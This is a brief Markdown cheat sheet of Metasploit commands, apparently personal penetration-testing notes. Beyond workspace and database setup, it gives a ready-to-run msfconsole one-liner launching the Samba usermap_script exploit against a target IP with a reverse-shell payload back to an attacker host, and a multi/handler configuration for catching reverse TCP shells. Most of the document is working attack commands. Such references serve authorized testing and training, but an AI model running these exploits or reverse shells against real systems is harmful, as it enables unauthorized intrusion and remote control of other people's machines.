# Metasploit

## init database

```bash
msfdb init
```

## create new workspace

```bash
workspace -a [name]
```

## switch to workspace

```bash
workspace [name]
```

## run commands without interactive shell

```bash
msfconsole -x "use exploit/multi/samba/usermap_script;\
set RHOST 172.16.194.172;\
set PAYLOAD cmd/unix/reverse;\
set LHOST 172.16.194.163;\
run"
```

## Multi-handler for reverse shell

```bash
use exploit/multi/handler
set LHOST 192.168.88.128
set LPORT 4444
set ExitOnSession False
```

### netcat/bash reverse

```bash
set PAYLOAD linux/x86/shell/reverse_tcp
```

### run in the background

```bash
run -j
```
